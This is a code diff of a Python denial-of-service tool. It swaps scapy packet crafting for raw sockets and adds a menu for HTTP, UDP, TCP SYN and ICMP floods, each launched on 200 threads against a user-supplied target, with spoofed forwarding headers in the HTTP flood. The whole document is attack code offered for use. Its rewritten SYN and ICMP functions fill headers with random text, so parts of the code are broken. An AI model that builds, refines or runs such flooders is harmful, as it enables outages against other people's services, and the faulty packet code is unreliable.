@@ -5,7 +5,6 @@ import string
 import time
 import os
 import socket
-from scapy.all import *
 
 # ANSI escape codes for colors
 class colors:
@@ -32,11 +31,6 @@ def send_http_request(url):
         'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
     ]
     
-    proxies = {
-        'http': 'http://your_proxy:port',
-        'https': 'https://your_proxy:port'
-    }
-    
     while True:
         try:
             params = {'q': genstr(random.randint(5, 15))}
@@ -45,7 +39,7 @@ def send_http_request(url):
                 'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),  # Simulate random IP
                 'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com'])  # Random referer
             }
-            response = session.get(url, params=params, headers=headers, proxies=proxies, timeout=10)  # Timeout set to 10 seconds
+            response = session.get(url, params=params, headers=headers, timeout=10)  # Timeout set to 10 seconds
             status_code = response.status_code
             if status_code == 200:
                 print(f"{colors.GREEN}Attack successful [{status_code}]{colors.END} Params: {params}")
@@ -66,29 +60,31 @@ def send_udp_flood(target_ip, target_port):
             print(f"{colors.RED}UDP Flood failed: {e}{colors.END}")
             time.sleep(random.randint(1, 3))  # Random backoff time between retries
 
-def send_syn_flood(target_ip, target_port):
+def send_tcp_syn_flood(target_ip, target_port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     while True:
         try:
-            ip = IP(dst=target_ip)
-            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
-            send(ip/tcp, verbose=False)
-            print(f"{colors.BLUE}SYN Flooding {target_ip}:{target_port}{colors.END}")
+            ip_header = genstr(20).encode('utf-8')
+            tcp_header = genstr(20).encode('utf-8')
+            packet = ip_header + tcp_header
+            sock.sendto(packet, (target_ip, target_port))
+            print(f"{colors.BLUE}TCP SYN Flooding {target_ip}:{target_port}{colors.END}")
         except Exception as e:
-            print(f"{colors.RED}SYN Flood failed: {e}{colors.END}")
+            print(f"{colors.RED}TCP SYN Flood failed: {e}{colors.END}")
             time.sleep(random.randint(1, 3))  # Random backoff time between retries
 
 def send_icmp_flood(target_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     while True:
         try:
-            ip = IP(dst=target_ip)
-            icmp = ICMP()
-            send(ip/icmp, verbose=False)
-            print(f"{colors.MAGENTA}ICMP Flooding {target_ip}{colors.END}")
+            packet = genstr(1024).encode('utf-8')
+            sock.sendto(packet, (target_ip, 0))
+            print(f"{colors.YELLOW}ICMP Flooding {target_ip}{colors.END}")
         except Exception as e:
             print(f"{colors.RED}ICMP Flood failed: {e}{colors.END}")
             time.sleep(random.randint(1, 3))  # Random backoff time between retries
 
-def main():
+def main_menu():
     os.system('clear')
     header = f"""
 {colors.RED}▒█▀▀█ ▀▄▒▄▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ {colors.END}
@@ -100,44 +96,51 @@ def main():
 =======================================
 """
     print(header)
-    print("Please enter your target URL or IP for the attack:")
-    target = input("Target URL/IP: ").strip()
-
-    print("Enter the type of attack (http/udp/syn/icmp):")
-    attack_type = input("Attack type: ").strip().lower()
-
-    threads = []
-    thread_count = 200  # Increase thread count for heavy load testing
-
-    if attack_type == "http":
-        for _ in range(thread_count):
-            t = threading.Thread(target=send_http_request, args=(target,))
-            t.start()
-            threads.append(t)
-    elif attack_type == "udp":
-        target_ip, target_port = target.split(':')
-        for _ in range(thread_count):
-            t = threading.Thread(target=send_udp_flood, args=(target_ip, int(target_port)))
-            t.start()
-            threads.append(t)
-    elif attack_type == "syn":
-        target_ip, target_port = target.split(':')
-        for _ in range(thread_count):
-            t = threading.Thread(target=send_syn_flood, args=(target_ip, int(target_port)))
-            t.start()
-            threads.append(t)
-    elif attack_type == "icmp":
-        for _ in range(thread_count):
-            t = threading.Thread(target=send_icmp_flood, args=(target,))
-            t.start()
-            threads.append(t)
-    else:
-        print(f"{colors.RED}Invalid attack type selected!{colors.END}")
-        return
+    print("Select Attack Method:")
+    print("1. HTTP Flood")
+    print("2. UDP Flood")
+    print("3. TCP SYN Flood")
+    print("4. ICMP Flood")
+    print("5. Exit")
     
-    # Wait for all threads to complete
-    for t in threads:
-        t.join()
+    choice = input("Enter your choice (1-5): ").strip()
+    return choice
+
+def main():
+    while True:
+        choice = main_menu()
+        if choice == '1':
+            print("Please enter your target URL:")
+            url = input("Target URL: ").strip()
+            threads = [threading.Thread(target=send_http_request, args=(url,)) for _ in range(200)]
+        elif choice == '2':
+            print("Please enter your target IP and port (format: IP:PORT):")
+            target_ip, target_port = input("Target IP:PORT: ").strip().split(':')
+            target_port = int(target_port)
+            threads = [threading.Thread(target=send_udp_flood, args=(target_ip, target_port)) for _ in range(200)]
+        elif choice == '3':
+            print("Please enter your target IP and port (format: IP:PORT):")
+            target_ip, target_port = input("Target IP:PORT: ").strip().split(':')
+            target_port = int(target_port)
+            threads = [threading.Thread(target=send_tcp_syn_flood, args=(target_ip, target_port)) for _ in range(200)]
+        elif choice == '4':
+            print("Please enter your target IP:")
+            target_ip = input("Target IP: ").strip()
+            threads = [threading.Thread(target=send_icmp_flood, args=(target_ip,)) for _ in range(200)]
+        elif choice == '5':
+            print(f"{colors.MAGENTA}Exiting...{colors.END}")
+            break
+        else:
+            print(f"{colors.RED}Invalid choice!{colors.END}")
+            continue
+        
+        # Start threads
+        for t in threads:
+            t.start()
+        
+        # Wait for all threads to complete
+        for t in threads:
+            t.join()
 
 if __name__ == "__main__":
     main()
